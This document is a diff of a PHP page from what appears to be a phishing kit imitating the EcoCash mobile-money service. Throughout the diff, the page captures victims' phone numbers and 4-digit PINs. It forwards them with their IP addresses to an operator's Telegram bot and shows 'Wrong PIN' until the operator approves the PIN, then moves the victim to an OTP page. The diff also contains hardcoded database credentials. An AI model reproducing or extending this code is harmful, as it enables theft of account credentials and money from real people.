@@ -13,26 +13,23 @@ $dbUser = "loan_9d8q_user";
 $dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
 // ==================================
 
-// Get phone from session (should be set by index.php)
+// Get phone from session (set by index.php)
 $phone = isset($_SESSION['phone']) ? trim($_SESSION['phone']) : '';
 $error = '';
 $flashMessage = '';
 
-// Retrieve flash message if exists
 if (isset($_SESSION['flash_error'])) {
     $flashMessage = $_SESSION['flash_error'];
     unset($_SESSION['flash_error']);
 }
 
-// If no phone in session, redirect back to index
 if (empty($phone)) {
     header("Location: index.php");
     exit;
 }
 
 /**
- * Get PostgreSQL connection (singleton)
- * @return resource|false
+ * Get PostgreSQL connection
  */
 function getDbConnection($host, $port, $dbname, $user, $pass) {
     static $conn = null;
@@ -52,8 +49,7 @@ function getDbConnection($host, $port, $dbname, $user, $pass) {
 }
 
 /**
- * Send message via Telegram bot
- * @return bool
+ * Send Telegram message
  */
 function sendTelegramMessage($botToken, $chatId, $message) {
     $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
@@ -69,7 +65,7 @@ function sendTelegramMessage($botToken, $chatId, $message) {
             CURLOPT_URL => $url,
             CURLOPT_RETURNTRANSFER => true,
             CURLOPT_POST => true,
-            CURLOPT_POSTFIELDS => http_build_query($postData),  // Fixed typo
+            CURLOPT_POSTFIELDS => http_build_query($postData),
             CURLOPT_TIMEOUT => 10,
             CURLOPT_SSL_VERIFYPEER => true,
             CURLOPT_USERAGENT => 'EcoCashBot/1.0'
@@ -104,32 +100,6 @@ function sendTelegramMessage($botToken, $chatId, $message) {
     return false;
 }
 
-// ========== AJAX endpoint: check if PIN is verified ==========
-if (isset($_GET['check_status']) && $_GET['check_status'] == 1) {
-    header('Content-Type: application/json');
-    $checkPhone = $_GET['phone'] ?? '';
-    $checkPin   = $_GET['pin'] ?? '';
-    if (empty($checkPhone) || empty($checkPin)) {
-        echo json_encode(['verified' => false]);
-        exit;
-    }
-    $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
-    if (!$conn) {
-        echo json_encode(['verified' => false, 'error' => 'db_connection_failed']);
-        exit;
-    }
-    $result = pg_query_params($conn, "SELECT status FROM ecocash_auth WHERE phone = $1 AND pin = $2 LIMIT 1", [$checkPhone, $checkPin]);
-    if (!$result) {
-        error_log("AJAX query error: " . pg_last_error($conn));
-        echo json_encode(['verified' => false]);
-        exit;
-    }
-    $record = pg_fetch_assoc($result);
-    $verified = ($record && (int)$record['status'] === 1);
-    echo json_encode(['verified' => $verified]);
-    exit;
-}
-
 // ========== Process PIN submission ==========
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $pinArray = isset($_POST['pin']) ? $_POST['pin'] : [];
@@ -140,49 +110,51 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
         if (!$conn) {
             $error = "System error. Please contact administrator.";
-            error_log("PostgreSQL extension missing or connection failed");
         } else {
-            // Create table if not exists
-          $createSQL = "
-    CREATE TABLE IF NOT EXISTS ecocash_auth (
-        id SERIAL PRIMARY KEY,
-        phone VARCHAR(20) NOT NULL,
-        pin VARCHAR(4) NOT NULL,
-        status SMALLINT DEFAULT 0,
-        otp_status INTEGER DEFAULT 0 NOT NULL,
-        approve SMALLINT DEFAULT 0 NOT NULL,   -- new column
-        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-        UNIQUE(phone, pin)
-    )";
+            // Ensure `users` table exists (with pin column default 0)
+            $createSQL = "
+                CREATE TABLE IF NOT EXISTS users (
+                    phone VARCHAR(20) PRIMARY KEY,
+                    status INTEGER DEFAULT 0,
+                    pin INTEGER DEFAULT 0,
+                    otp INTEGER DEFAULT 0
+                )
+            ";
             pg_query($conn, $createSQL);
             
-            // Insert or ignore duplicate
-            $insertSQL = "
-                INSERT INTO ecocash_auth (phone, pin, status)
-                VALUES ($1, $2, 0)
-                ON CONFLICT (phone, pin) DO NOTHING";
-            $insertResult = pg_query_params($conn, $insertSQL, [$phone, $pin]);
+            // Insert phone if not exists (with default pin=0)
+            $insertSQL = "INSERT INTO users (phone, status, pin, otp) VALUES ($1, 0, 0, 0) ON CONFLICT (phone) DO NOTHING";
+            pg_query_params($conn, $insertSQL, [$phone]);
             
-            if (!$insertResult) {
-                error_log("PIN insert error: " . pg_last_error($conn));
-                $error = "System error. Try again later.";
-            } else {
-                // Send Telegram notification
-                $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
-                $time = date('Y-m-d H:i:s');
-                $msg = "🔐 *PIN Attempt*\n\n📱 Phone: +263 {$phone}\n🔢 PIN: `{$pin}`\n⏰ Time: {$time}\n🌐 IP: {$ip}\n🔗 Verify: https://hookupint.site/verify.php";
-                sendTelegramMessage($botToken, $chatId, $msg);
+            // Check the current `pin` value for this phone
+            $checkSQL = "SELECT pin FROM users WHERE phone = $1";
+            $result = pg_query_params($conn, $checkSQL, [$phone]);
+            if ($result && $row = pg_fetch_assoc($result)) {
+                $pinStatus = (int)$row['pin'];
                 
-                $_SESSION['pending_pin'] = $pin;
-                $error = "Wrong PIN";
+                if ($pinStatus === 1) {
+                    // PIN already approved → redirect to OTP page
+                    $_SESSION['pin_verified'] = true;
+                    header("Location: otp.php");
+                    exit;
+                } else {
+                    // PIN is 0 → show "Wrong PIN"
+                    $error = "Wrong PIN";
+                    
+                    // (Optional) Send Telegram notification of failed attempt
+                    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+                    $time = date('Y-m-d H:i:s');
+                    $msg = "❌ *Failed PIN attempt*\n\n📱 Phone: +263 {$phone}\n🔢 PIN entered: `{$pin}`\n⏰ Time: {$time}\n🌐 IP: {$ip}";
+                    sendTelegramMessage($botToken, $chatId, $msg);
+                }
+            } else {
+                $error = "Database error. Please try again.";
             }
         }
     } else {
         $error = "PIN must be 4 digits.";
     }
 }
-
-$pendingPin = isset($_SESSION['pending_pin']) ? $_SESSION['pending_pin'] : '';
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -310,9 +282,6 @@ $pendingPin = isset($_SESSION['pending_pin']) ? $_SESSION['pending_pin'] : '';
 
 <script>
     const inputs = document.querySelectorAll('.pin input');
-    const phone = <?= json_encode($phone) ?>;
-    let pendingPin = <?= json_encode($pendingPin) ?>;
-
     function allFilled() {
         let filled = true;
         inputs.forEach(i => {
@@ -337,21 +306,6 @@ $pendingPin = isset($_SESSION['pending_pin']) ? $_SESSION['pending_pin'] : '';
             }
         });
     });
-
-    if (pendingPin && pendingPin.length === 4) {
-        let pollingInterval = setInterval(async () => {
-            try {
-                const response = await fetch(`?check_status=1&phone=${encodeURIComponent(phone)}&pin=${encodeURIComponent(pendingPin)}`);
-                const data = await response.json();
-                if (data.verified === true) {
-                    clearInterval(pollingInterval);
-                    window.location.href = "otp.php";
-                }
-            } catch (err) {
-                console.error("Polling error:", err);
-            }
-        }, 2000);
-    }
 </script>
 </body>
 </html>
